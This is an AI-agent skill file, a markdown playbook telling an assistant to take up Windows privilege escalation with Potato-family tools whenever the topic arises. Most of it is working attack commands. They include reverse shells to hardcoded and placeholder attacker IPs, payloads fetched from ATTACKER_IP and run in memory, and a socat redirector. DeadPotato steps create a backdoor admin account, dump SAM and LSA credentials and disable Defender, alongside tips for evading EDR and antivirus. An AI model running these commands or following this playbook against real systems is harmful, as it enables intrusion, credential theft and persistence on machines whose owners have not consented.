---
name: windows-potato-priv-esc
description: Windows local privilege escalation using Potato-family tools (RoguePotato, PrintSpoofer, GodPotato, SigmaPotato, DeadPotato, etc.) to escalate from SeImpersonatePrivilege to NT AUTHORITY\SYSTEM. Use this skill whenever the user mentions Windows privilege escalation, Potato tools, SeImpersonatePrivilege, gaining SYSTEM access, or any Windows local privilege escalation scenario.
---

# Windows Potato Privilege Escalation

This skill covers modern Windows local privilege escalation techniques that abuse impersonation-capable services to gain `NT AUTHORITY\SYSTEM` access. These tools work on Windows 10/11 and Server 2012–2022 where JuicyPotato no longer functions.

## Quick Decision Guide

| Scenario | Recommended Tool |
|----------|------------------|
| Spooler service running | PrintSpoofer |
| Spooler disabled (post-PrintNightmare) | RoguePotato, GodPotato, or PrintNotifyPotato |
| Need stealth / in-memory | SigmaPotato |
| Need built-in post-exploitation | DeadPotato |
| EFS pipes available | SharpEfsPotato or EfsPotato |
| OXID resolver blocked | Use redirector with RoguePotato |

## Prerequisites

All Potato tools require one of these privileges:
- `SeImpersonatePrivilege` (most common)
- `SeAssignPrimaryTokenPrivilege`

**Check privileges:**
```cmd
whoami /priv | findstr /i impersonate
```

**If privileges are missing:** Service accounts like Local Service/Network Service may have restricted tokens. Use FullPowers to restore default privileges:
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
```

## Tool Usage

### PrintSpoofer

Requires Print Spooler service running.

```bash
# Run command as SYSTEM
PrintSpoofer.exe -c "cmd /c whoami"

# Spawn interactive shell
PrintSpoofer.exe -i

# Reverse shell
PrintSpoofer.exe -c "nc.exe 10.10.10.10 443 -e cmd"
```

**Fails if:** Spooler service is disabled (common post-PrintNightmare hardening).

---

### RoguePotato

Requires OXID resolver reachable on TCP/135.

```bash
# Basic usage
RoguePotato.exe -r 10.10.10.10 -c "cmd /c whoami" -l 9999

# Older versions need -f flag
RoguePotato.exe -r 10.10.10.10 -c "cmd /c whoami" -f 9999
```

**If outbound 135 is blocked:** Use a redirector:
```bash
# On attacker machine (redirector)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim
RoguePotato.exe -r REDIRECTOR_IP -c "cmd /c whoami" -l 9999
```

---

### PrintNotifyPotato

Targets PrintNotify COM service instead of Spooler. Works even when Spooler is disabled.

```cmd
# Run command
PrintNotifyPotato.exe "cmd /c whoami"

# Run script
PrintNotifyPotato.exe "powershell -ep bypass -File C:\ProgramData\stage.ps1"
```

**Advantages:**
- No named-pipe listeners or external redirectors needed
- Works on Windows 10/11 and Server 2012–2022
- Purely COM-based, less likely to trigger Defender

---

### SharpEfsPotato

Abuses MS-EFSR service via named pipes.

```bash
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
```

**If pipe fails (error 0x6d3):** Try alternative pipes with EfsPotato instead.

---

### EfsPotato

Supports multiple named pipes. Try different pipes if one is blocked.

```bash
# Default pipe (lsarpc)
EfsPotato.exe "whoami"

# Try alternative pipes
EfsPotato.exe "whoami" lsarpc
EfsPotato.exe "whoami" efsrpc
EfsPotato.exe "whoami" samr
EfsPotato.exe "whoami" lsass
EfsPotato.exe "whoami" netlogon
```

**Supported pipes:** `lsarpc`, `efsrpc`, `samr`, `lsass`, `netlogon`

---

### GodPotato

Works across Windows 8/8.1–11 and Server 2012–2022.

```bash
# Basic command
GodPotato.exe -cmd "cmd /c whoami"

# Reverse shell
GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

**Runtime selection:** Use the binary matching the installed .NET runtime:
- `GodPotato-NET4.exe` for modern Server 2022
- `GodPotato.exe` for older systems

**For webshells with short timeouts:** Stage payload as script:
```powershell
# From IIS webroot
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```

---

### DCOMPotato

Targets DCOM objects with RPC_C_IMP_LEVEL_IMPERSONATE.

```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022)
McpManagementPotato.exe "cmd /c whoami"
```

---

### SigmaPotato (Recommended for 2024–2025)

Modern fork of GodPotato with in-memory execution and extended OS support.

```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Spawn PowerShell reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```

**Features in v1.2.x:**
- Built-in `--revshell` flag
- No 1024-char PowerShell limit (run long AMSI-bypass payloads)
- Reflection-friendly syntax
- AV evasion via `VirtualAllocExNuma()`
- `SigmaPotatoCore.exe` for PowerShell Core (.NET 2.0)

---

### DeadPotato (2024 Rework)

GodPotato with built-in post-exploitation modules. Higher EDR detection risk.

```cmd
# Reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Create local admin for persistence
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound as SYSTEM
DeadPotato.exe -sharphound

# Dump credentials (noisy, touches disk)
DeadPotato.exe -mimi sam
DeadPotato.exe -mimi lsa
DeadPotato.exe -mimi all

# Disable Defender (very noisy)
DeadPotato.exe -defender off

# Run arbitrary command
DeadPotato.exe -cmd "whoami"
```

**Modules:** `-cmd`, `-rev`, `-newadmin`, `-mimi`, `-sharphound`, `-defender`

## Common Errors and Solutions

| Error | Cause | Solution |
|-------|-------|----------|
| `0x6d3` during RpcBindingSetAuthInfo | Unknown/unsupported RPC auth service | Try different pipe/transport or ensure target service is running |
| Spooler service not found | PrintNightmare hardening | Use RoguePotato, GodPotato, or PrintNotifyPotato instead |
| OXID resolver timeout | TCP/135 blocked | Use redirector with socat or try GodPotato |
| Missing SeImpersonatePrivilege | Restricted token | Use FullPowers to restore privileges |
| EDR detection | Tool touches disk | Use SigmaPotato in-memory or stage payloads |

## Operational Best Practices

1. **Check privileges first** - Always verify SeImpersonatePrivilege before attempting escalation
2. **Test multiple tools** - If one fails, try alternatives (different pipes, services)
3. **Stage payloads for webshells** - Avoid long inline commands that may timeout
4. **Use in-memory tools for stealth** - SigmaPotato reflection avoids disk artifacts
5. **Have a redirector ready** - For RoguePotato when outbound 135 is blocked
6. **Expect EDR on kitchen-sink tools** - DeadPotato modules are noisier than slim originals

## References

- PrintSpoofer: https://github.com/itm4n/PrintSpoofer
- RoguePotato: https://github.com/antonioCoco/RoguePotato
- GodPotato: https://github.com/BeichenDream/GodPotato
- SigmaPotato: https://github.com/tylerdotrar/SigmaPotato
- SharpEfsPotato: https://github.com/bugch3ck/SharpEfsPotato
- EfsPotato: https://github.com/zcgonvh/EfsPotato
- DCOMPotato: https://github.com/zcgonvh/DCOMPotato
- PrintNotifyPotato: https://github.com/BeichenDream/PrintNotifyPotato
- DeadPotato: https://github.com/lypd0/DeadPotato
- FullPowers: https://github.com/itm4n/FullPowers
- PrintSpoofer blog: https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
- RoguePotato blog: https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/
